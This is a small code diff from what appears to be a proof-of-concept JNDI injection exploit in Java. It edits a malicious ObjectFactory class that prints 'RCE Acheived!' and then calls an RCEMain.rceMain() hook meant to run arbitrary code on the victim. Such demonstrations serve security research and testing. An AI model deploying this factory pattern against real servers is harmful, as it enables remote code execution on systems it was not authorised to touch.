@@ -15,7 +15,7 @@ import javax.naming.Name;
 import javax.naming.Context;
 
 
-class FactoryClass implements ObjectFactory {
+public class FactoryClass implements ObjectFactory {
     @Override
     public MadeClass getObjectInstance(
         Object obj,
@@ -26,10 +26,10 @@ class FactoryClass implements ObjectFactory {
 
         // Add instrumentation
         System.out.println("RCE Acheived!");
-        System.out.println("    obj:     " + obj    );
-        System.out.println("    name:    " + name   );
-        System.out.println("    nameCtx: " + nameCtx);
-        System.out.println("    env:     " + env    );
+        System.out.println("name:    " + name   );
+        System.out.println("nameCtx: " + nameCtx);
+        System.out.println("env:     " + env    );
+        System.out.println("obj:     " + obj    );
 
         // Do whatever we want
         RCEMain.rceMain();
